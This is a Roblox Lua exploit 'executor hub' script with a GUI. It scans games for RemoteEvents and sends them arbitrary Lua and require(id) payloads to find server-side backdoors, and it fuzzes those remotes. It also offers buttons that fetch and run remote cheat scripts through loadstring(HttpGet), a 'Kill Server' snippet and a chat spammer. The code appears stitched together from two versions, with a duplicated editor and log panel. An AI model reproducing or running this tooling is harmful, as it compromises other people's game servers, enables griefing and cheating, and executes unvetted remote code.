local Players = game:GetService("Players")
local Player = Players.LocalPlayer
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "Dominant_V7_SS"
ScreenGui.Parent = Player:WaitForChild("PlayerGui")

local selectedRemote = nil

local Main = Instance.new("Frame")
Main.Size = UDim2.new(0, 800, 0, 500)
Main.Position = UDim2.new(0.5, -400, 0.5, -250)
Main.BackgroundColor3 = Color3.fromRGB(230, 230, 230)
Main.BorderSizePixel = 2
Main.Active = true
Main.Draggable = true
Main.Parent = ScreenGui

local TopBar = Instance.new("Frame")
TopBar.Size = UDim2.new(1, 0, 0, 30)
TopBar.BackgroundColor3 = Color3.fromRGB(180, 180, 180)
TopBar.Parent = Main

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 1, 0)
Title.Text = "  DOMINANT SS SUITE v7.0 | REMOTE & MODULE HUB  "
Title.Font = Enum.Font.SourceSansBold
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.BackgroundTransparency = 1
Title.Parent = TopBar

local Logo = Instance.new("ImageLabel")
Logo.Size = UDim2.new(0, 65, 0, 65)
Logo.Position = UDim2.new(0.5, -32, 0, -18)
Logo.Image = "rbxassetid://4359357959"
Logo.BackgroundTransparency = 1
Logo.ZIndex = 15
Logo.Parent = Main


local Editor = Instance.new("TextBox")
Editor.Size = UDim2.new(0, 340, 0, 280)
Editor.Position = UDim2.new(0.02, 0, 0.1, 0)
Editor.BackgroundColor3 = Color3.new(1, 1, 1)
Editor.MultiLine = true
Editor.Text = "-- Remote Code / Module ID"
Editor.Font = Enum.Font.Code
Editor.TextXAlignment = Enum.TextXAlignment.Left
Editor.TextYAlignment = Enum.TextYAlignment.Top
Editor.Parent = Main

local Logs = Instance.new("TextLabel")
Logs.Size = UDim2.new(0, 340, 0, 80)
Logs.Position = UDim2.new(0.02, 0, 0.82, 0)
Logs.BackgroundColor3 = Color3.fromRGB(245, 245, 245)
Logs.Text = "[LOG]: Suite Loaded."
Logs.Font = Enum.Font.Code
Logs.TextSize = 12
Logs.TextWrapped = true
Logs.Parent = Main



local function createPanel(title, xPos)
    local f = Instance.new("Frame")
    f.Size = UDim2.new(0, 140, 0, 420)
    f.Position = UDim2.new(xPos, 0, 0.1, 0)
    f.BackgroundColor3 = Color3.fromRGB(210, 210, 210)
    f.Parent = Main
    
    local t = Instance.new("TextLabel")
    t.Size = UDim2.new(1, 0, 0, 25)
    t.Text = title
    t.BackgroundColor3 = Color3.fromRGB(170, 170, 170)
    t.Font = Enum.Font.SourceSansBold
    t.Parent = f
    
    local s = Instance.new("ScrollingFrame")
    s.Size = UDim2.new(1, 0, 1, -25)
    s.Position = UDim2.new(0, 0, 0, 25)
    s.BackgroundTransparency = 1
    s.CanvasSize = UDim2.new(0, 0, 5, 0)
    s.Parent = f
    Instance.new("UIListLayout", s)
    return s
end

local ScriptHub = createPanel("SCRIPT HUB", 0.45)
local ModuleHub = createPanel("MODULE IDs", 0.63)
local RemoteHub = createPanel("REMOTES", 0.81)

-- 1. SCRIPT HUB EKLEMELERİ
local sList = {
    ["RC7 SS"] = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/CoreGui/Scripts/main/RC7"))()',
    ["Inf Yield"] = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()',
    ["Kill Server"] = 'for _,v in pairs(game.Players:GetPlayers()) do v.Character:BreakJoints() end',
    ["Btools (SS)"] = 'Instance.new("HopperBin", game.Players.LocalPlayer.Backpack).BinType = 4',
    ["Chat Spammer"] = 'while task.wait(0.5) do game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Dominant V7 On Top!", "All") end'
}

for name, code in pairs(sList) do
    local b = Instance.new("TextButton")
    b.Size = UDim2.new(1, 0, 0, 30)
    b.Text = name
    b.Parent = ScriptHub
    b.MouseButton1Click:Connect(function() Editor.Text = code end)
end

local mList = {
    ["UTG Admin"] = "3425032542",
    ["Kohls Admin"] = "3239236979",
    ["Screamer"] = "134250392",
    ["Fire Part"] = "10293021",
    ["Dominant SS"] = "48291039" -- Örnek ID
}

for name, id in pairs(mList) do
    local b = Instance.new("TextButton")
    b.Size = UDim2.new(1, 0, 0, 30)
    b.Text = name
    b.Parent = ModuleHub
    b.MouseButton1Click:Connect(function() Editor.Text = id end)
end


local function scan()
    for _, child in pairs(RemoteHub:GetChildren()) do if child:IsA("TextButton") then child:Destroy() end end
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") then
            local b = Instance.new("TextButton")
            b.Size = UDim2.new(1, 0, 0, 30)
            b.Text = v.Name
            b.Parent = RemoteHub
            b.MouseButton1Click:Connect(function() 
                selectedRemote = v 
                Logs.Text = "[SELECTED]: " .. v.Name
            end)
        end
    end
end


local function createAction(t, x, color)
    local b = Instance.new("TextButton")
    b.Size = UDim2.new(0, 105, 0, 40)
    b.Position = UDim2.new(x, 0, 0.7, 0)
    b.Text = t
    b.BackgroundColor3 = color or Color3.fromRGB(240, 240, 240)
    b.Font = Enum.Font.SourceSansBold
    b.Parent = Main
    return b
end

local RemoteExec = createAction("EXECUTE SS", 0.02, Color3.fromRGB(255, 180, 180))
local RequireSS = createAction("REQUIRE ID", 0.16, Color3.fromRGB(180, 255, 180))
local FuzzBtn = createAction("AUTO FUZZ", 0.3, Color3.fromRGB(200, 200, 255))
local Refresh = createAction("REFRESH", 0.3, 0.82)


RemoteExec.MouseButton1Click:Connect(function()
    if selectedRemote then
        selectedRemote:FireServer(Editor.Text)
        Logs.Text = "[IDE]: Payload sent to " .. selectedRemote.Name
    else
        Logs.Text = "[ERR]: Select a Remote!"
    end
end)

RequireSS.MouseButton1Click:Connect(function()
    if selectedRemote then
        local id = Editor.Text
        selectedRemote:FireServer("require(" .. id .. ")")
        Logs.Text = "[REQ]: require(" .. id .. ") sent to server."
    else
        Logs.Text = "[ERR]: Select a Remote!"
    end
end)


FuzzBtn.MouseButton1Click:Connect(function()
    if selectedRemote then
        Logs.Text = "[FUZZING]: Trying common patterns..."
        local patterns = {Editor.Text, {Editor.Text}, true, 1, "run"}
        for _, p in pairs(patterns) do
            selectedRemote:FireServer(p)
            task.wait(0.1)
        end
        Logs.Text = "[DONE]: Fuzzing complete. Check Server."
    end
end)

Refresh.MouseButton1Click:Connect(scan)
scan()
Logo.Image = "rbxassetid://4359357959"
Logo.BackgroundTransparency = 1
Logo.ZIndex = 5
Logo.Parent = Main


local EditorScroll = Instance.new("ScrollingFrame")
EditorScroll.Size = UDim2.new(0, 420, 0, 230)
EditorScroll.Position = UDim2.new(0.02, 0, 0.1, 0)
EditorScroll.BackgroundColor3 = Color3.new(1, 1, 1)
EditorScroll.CanvasSize = UDim2.new(0, 0, 15, 0)
EditorScroll.ScrollBarThickness = 6
EditorScroll.Parent = Main

local EditorBox = Instance.new("TextBox")
EditorBox.Size = UDim2.new(1, 0, 1, 0)
EditorBox.Text = "-- Dominant v3.2\nprint('Waiting for command...')"
EditorBox.MultiLine = true
EditorBox.ClearTextOnFocus = false
EditorBox.TextXAlignment = Enum.TextXAlignment.Left
EditorBox.TextYAlignment = Enum.TextYAlignment.Top
EditorBox.Font = Enum.Font.Code
EditorBox.TextSize = 14
EditorBox.Parent = EditorScroll

local LogScroll = Instance.new("ScrollingFrame")
LogScroll.Size = UDim2.new(0, 420, 0, 90)
LogScroll.Position = UDim2.new(0.02, 0, 0.75, 0)
LogScroll.BackgroundColor3 = Color3.new(1, 1, 1)
LogScroll.CanvasSize = UDim2.new(0, 0, 20, 0) -- Çok fazla remote için geniş alan
LogScroll.ScrollBarThickness = 4
LogScroll.Parent = Main

local Logs = Instance.new("TextLabel")
Logs.Size = UDim2.new(1, 0, 1, 0)
Logs.BackgroundTransparency = 1
Logs.Text = "[SYSTEM]: Ready to scan Remotes..."
Logs.TextXAlignment = Enum.TextXAlignment.Left
Logs.TextYAlignment = Enum.TextYAlignment.Top
Logs.Font = Enum.Font.Code
Logs.TextSize = 12
Logs.TextWrapped = true
Logs.Parent = LogScroll


local ScriptSection = Instance.new("Frame")
ScriptSection.Size = UDim2.new(0, 220, 0, 350)
ScriptSection.Position = UDim2.new(0.65, 0, 0.1, 0)
ScriptSection.BackgroundColor3 = Color3.fromRGB(225, 225, 225)
ScriptSection.BorderSizePixel = 1
ScriptSection.Parent = Main

local ScriptTitle = Instance.new("TextLabel")
ScriptTitle.Size = UDim2.new(1, 0, 0, 25)
ScriptTitle.Text = "SCRIPT HUB (LUA)"
ScriptTitle.BackgroundColor3 = Color3.fromRGB(200, 200, 200)
ScriptTitle.Font = Enum.Font.SourceSansBold
ScriptTitle.Parent = ScriptSection

local ScriptScroll = Instance.new("ScrollingFrame")
ScriptScroll.Size = UDim2.new(1, 0, 1, -25)
ScriptScroll.Position = UDim2.new(0, 0, 0, 25)
ScriptScroll.BackgroundTransparency = 1
ScriptScroll.CanvasSize = UDim2.new(0, 0, 4, 0)
ScriptScroll.ScrollBarThickness = 5
ScriptScroll.Parent = ScriptSection

local SList = Instance.new("UIListLayout")
SList.Padding = UDim.new(0, 2)
SList.Parent = ScriptScroll


local ScriptLibrary = {
	["RC7 (GUI)"] = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/CoreGui/Scripts/main/RC7"))()',
	["Infinite Yield"] = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()',
	["Dex Explorer"] = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/Babyhamsta/RBLX_Scripts/main/Universal/Dex.lua"))()',
	["Simple Spy V3"] = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/exxtremestuffs/SimpleSpyV3/main/main.lua"))()',
	["Dark Dex V4"] = 'loadstring(game:HttpGet("https://gist.githubusercontent.com/DinosaurButWithNoLife/3924f3ad8438107779708f09fcb6ad27/raw/dex.lua"))()',
	["OwlHub (Aim/ESP)"] = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/CriShoux/OwlHub/master/OwlHub.txt"))()',
	["Universal ESP"] = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/ic3w0lf22/Unnamed-ESP/master/UnnamedESP.lua"))()',
	["Fly Gui (V3)"] = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/XNEOFF/FlyGuiV3/main/FlyGuiV3.lua"))()',
	["Anti-AFK"] = 'local vu = game:GetService("VirtualUser"); game:GetService("Players").LocalPlayer.Idled:Connect(function() vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame); task.wait(1); vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame) end)',
	["Rejoin Game"] = 'game:GetService("TeleportService"):Teleport(game.PlaceId, game.Players.LocalPlayer)',
    ["Chat Spammer"] = 'while task.wait(1) do game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Dominant Executor On Top!", "All") end'
}

for name, code in pairs(ScriptLibrary) do
	local sBtn = Instance.new("TextButton")
	sBtn.Size = UDim2.new(1, 0, 0, 30)
	sBtn.Text = " " .. name
	sBtn.TextXAlignment = Enum.TextXAlignment.Left
	sBtn.BackgroundColor3 = Color3.fromRGB(240, 240, 240)
	sBtn.BorderSizePixel = 0
	sBtn.Font = Enum.Font.SourceSans
	sBtn.Parent = ScriptScroll
	
	sBtn.MouseButton1Click:Connect(function()
		EditorBox.Text = code
		Logs.Text = Logs.Text .. "\n[LOADED]: " .. name
		LogScroll.CanvasPosition = Vector2.new(0, 99999)
	end)
end


local function createBtn(name, xPos)
	local b = Instance.new("TextButton")
	b.Size = UDim2.new(0, 130, 0, 30)
	b.Position = UDim2.new(xPos, 0, 0.67, 0)
	b.Text = name
	b.BackgroundColor3 = Color3.fromRGB(240, 240, 240)
	b.BorderSizePixel = 1
	b.Parent = Main
	return b
end

local Exec = createBtn("Execute", 0.02)
local Clear = createBtn("Clear", 0.22)
local Inject = createBtn("Inject", 0.42)


Inject.MouseButton1Click:Connect(function()
	Logs.Text = Logs.Text .. "\n[SCANNING]: Fetching all RemoteEvents..."
	local count = 0
	for _, v in pairs(game:GetDescendants()) do
		pcall(function()
			if v:IsA("RemoteEvent") then
				count = count + 1
				Logs.Text = Logs.Text .. "\n> EVENT: " .. v.Name .. " | In: " .. v.Parent.Name
			elseif v:IsA("RemoteFunction") then
				count = count + 1
				Logs.Text = Logs.Text .. "\n> FUNC: " .. v.Name .. " | In: " .. v.Parent.Name
			end
		end)
	end
	Logs.Text = Logs.Text .. "\n[SUCCESS]: Found " .. count .. " Remotes."
	LogScroll.CanvasPosition = Vector2.new(0, 99999)
end)

Exec.MouseButton1Click:Connect(function()
	local f, e = loadstring(EditorBox.Text)
	if f then 
		task.spawn(f) 
		Logs.Text = Logs.Text .. "\n[IDE]: Executed Successfully."
	else 
		Logs.Text = Logs.Text .. "\n[SYNTAX ERR]: "..e 
	end
	LogScroll.CanvasPosition = Vector2.new(0, 99999)
end)

Clear.MouseButton1Click:Connect(function() EditorBox.Text = "" end)
